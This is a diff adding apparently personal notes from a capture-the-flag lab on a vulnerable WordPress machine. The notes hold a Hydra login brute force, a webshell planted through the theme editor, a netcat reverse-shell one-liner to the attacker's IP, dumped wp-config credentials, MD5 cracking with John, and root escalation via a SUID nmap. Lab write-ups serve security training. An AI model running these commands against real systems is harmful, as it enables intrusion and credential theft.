@@ -1,0 +1,263 @@
+
+
+robots.txt
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+
+
+fsocity is a very alrge wordlist.
+
+lots of pages try to push us into a wpsite.
+
+http://10.201.67.144/wp-login.php
+
+
+wpscan and endpoints such as wp-json/wp/v2/users do not yield us any results
+the .dic provided is our clue
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# hydra -L fsocity.txt -p test 10.201.67.144 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-06 16:24:35
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
+[DATA] attacking http-post-form://10.201.67.144:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid
+[80][http-post-form] host: 10.201.67.144   login: Elliot   password: test
+[80][http-post-form] host: 10.201.67.144   login: elliot   password: test
+[STATUS] 2713.00 tries/min, 2713 tries in 00:01h, 855522 to do in 05:16h, 16 active
+[STATUS] 2793.33 tries/min, 8380 tries in 00:03h, 849855 to do in 05:05h, 16 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+change in ip
+
+looking at writeups.
+the password appears very deep into the wordlist
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat fsocity.txt |grep -n "ER28-0652"
+858151:ER28-0652
+
+
+we go in, edit themes, insert webshell.
+
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc 10.6.66.96 53 > /tmp/s
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.28.225] 60838
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+
+
+daemon@ip-10-201-28-225:/opt/bitnami/apps/wordpress/htdocs$ cat wp-config.php 
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'bitnami_wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'bn_wordpress');
+
+/** MySQL database password */
+define('DB_PASSWORD', '570fd42948');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost:3306');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY', '680da46b083797689c88de74fb0e37751543e73da030db586c15c0324e0cedb9');
+define('SECURE_AUTH_KEY', 'b5b074d24786c50a8566969fda3db0817acb9dfc89cc6c4385ef11006bbd11d8');
+define('LOGGED_IN_KEY', 'fbefe850e9c60842e9e53ce239a42295870e1714edc75620ca69eb6df8c46d33');
+define('NONCE_KEY', '4b49f12364adbfee4adb90a3ee653321ef4697073705a324013484e16d7a507a');
+define('AUTH_SALT', '237ceb3335e2645a34f9630564bdb2d20c4cf839f191c7f339be8335bc2f6abc');
+define('SECURE_AUTH_SALT', '78c494df94f55b27322220ae093effe08ec9e75a3159ebd472a625a6ae62004f');
+define('LOGGED_IN_SALT', '3e824b24e1e23252c2d3c6718bb9ac862d61406333c333ee664527a81b720f22');
+define('NONCE_SALT', '108211dc940a29d954ea3f78fce857a8fb018e437352aaf3c9fe0c3d57d31635');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+/**
+ * The WP_SITEURL and WP_HOME options are configured to access from any hostname or IP address.
+ * If you want to access only from an specific domain, you can modify them. For example:
+ *  define('WP_HOME','http://example.com');
+ *  define('WP_SITEURL','http://example.com');
+ *
+*/
+
+define('WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/');
+define('WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/');
+
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+define('WP_TEMP_DIR', '/opt/bitnami/apps/wordpress/tmp');
+
+
+define('FS_METHOD', 'ftpext');
+define('FTP_BASE', '/opt/bitnami/apps/wordpress/htdocs/');
+define('FTP_USER', 'bitnamiftp');
+define('FTP_PASS', 'inevoL7eAlBeD2b5WszPbZ2gJ971tJZtP0j86NYPyh6Wfz1x8a');
+define('FTP_HOST', '127.0.0.1');
+define('FTP_SSL', false);
+
+daemon@ip-10-201-28-225:/opt/bitnami/apps/wordpress/htdocs$ 
+
+
+
+daemon@ip-10-201-28-225:/opt/bitnami/apps/wordpress/htdocs$ cd /home
+daemon@ip-10-201-28-225:/home$ ls
+robot  ubuntu
+daemon@ip-10-201-28-225:/home$ cd robot
+daemon@ip-10-201-28-225:/home/robot$ ls -lsa
+total 16
+4 drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+4 drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
+4 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+4 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+daemon@ip-10-201-28-225:/home/robot$ cat key-2-of-3.txt 
+cat: key-2-of-3.txt: Permission denied
+daemon@ip-10-201-28-225:/home/robot$ cat password.raw-md5 
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@ip-10-201-28-225:/home/robot$ 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (?)     
+1g 0:00:00:00 DONE (2025-11-06 17:30) 33.33g/s 1356Kp/s 1356Kc/s 1356KC/s bonjour1..teletubbies
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+daemon@ip-10-201-28-225:/home/robot$ su robot
+Password: 
+$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+$ 
+
+
+
+robot@ip-10-201-28-225:~$ find / -perm -u=s -type f 2>/dev/null
+/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+robot@ip-10-201-28-225:~$ 
+
+Nmap stopped providing interactive with version 5.00 in July 2009.
+Otherwise, we could make our own malicious script and priv esc that way.
+In this case, NSE scripting is not even available until version 4.20.
+otherwise, we could
+
+echo 'os.execute("/bin/sh")' > /tmp/root.nse
+nmap --script=/tmp/root.nse
+
+S1ren performs this exploit in 15 DC-6
+
+
+robot@ip-10-201-28-225:~$ /usr/local/bin/nmap --version
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> id
+uid=0(root) gid=0(root) groups=0(root),1002(robot)
+nmap> !sh
+root@ip-10-201-28-225:~# 
+
+
+
+
+
+
